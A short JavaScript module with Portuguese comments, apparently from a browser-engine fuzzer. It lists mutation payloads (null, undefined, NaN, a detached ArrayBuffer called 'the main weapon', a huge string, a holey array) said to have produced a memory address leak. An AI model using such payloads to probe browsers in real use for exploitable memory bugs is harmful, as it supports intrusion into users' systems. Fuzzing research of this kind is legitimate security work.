
/**
 * MÓDULO 2: MUTATOR (MINIMIZADO)
 * Foco exclusivo: Payloads que geraram o vazamento 0x7ff80000.
 */

export const Mutator = {
    getPayloads: function() {
        const payloads = [];

        // Primitivos que quebram a lógica C++
        payloads.push({ type: "PRIMITIVE", label: "Null", val: null });
        payloads.push({ type: "PRIMITIVE", label: "Undefined", val: undefined });
        payloads.push({ type: "PRIMITIVE", label: "NaN", val: NaN });

        // O Buffer Desanexado (A arma principal)
        try {
            let ab = new ArrayBuffer(1024);
            let mc = new MessageChannel();
            mc.port1.postMessage(ab, [ab]); 
            payloads.push({ type: "MEMORY", label: "Detached_Buffer", val: ab });
        } catch(e) {}

        // Pressão de Memória
        payloads.push({ type: "MEMORY", label: "Giant_String", val: "A".repeat(1024 * 512) });
        
        let holey = [1, 2, 3];
        holey[100] = 4;
        payloads.push({ type: "MEMORY", label: "Holey_Array", val: holey });

        return payloads;
    }
};
